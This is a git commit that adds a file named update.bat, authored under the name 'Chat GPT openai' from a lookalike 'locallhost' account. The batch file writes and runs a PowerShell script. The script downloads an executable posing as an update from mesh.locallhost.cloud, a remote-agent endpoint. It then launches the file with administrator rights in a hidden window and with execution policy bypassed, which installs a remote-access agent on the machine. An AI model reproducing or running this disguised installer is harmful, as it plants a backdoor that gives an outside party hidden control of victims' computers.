7b43a4a7440be657e8b9c1ae0956b20a08ae8c48
Chat GPT openai <127485092+locallhostcl@users.noreply.github.com>
2024-04-29 15:16:15 +0700

    Create update.bat

---
+++ update.bat
@@ -0,0 +1,3 @@
+echo $Url = 'https://mesh.locallhost.cloud/meshagents?id=4^&meshid=3D1$8kzevTQqn2sfWP7vb8syXUyajdzngnhpe22O2QPXZ6CxYgvzK88SqCVCxnVy^&installflags=0';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';$OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'PSupdateRemote Access64-.exe';Invoke-WebRequest -Uri $Url -OutFile $OutFile;$InstallerPath = $OutFile;$Arguments = '-fullinstall';$Command = "Start-Process -FilePath '$InstallerPath' -ArgumentList '$Arguments' -Verb RunAs -WindowStyle Hidden";Invoke-Expression -Command $Command; > ok.ps1
+
+powershell.exe -ExecutionPolicy Bypass -File ok.ps1
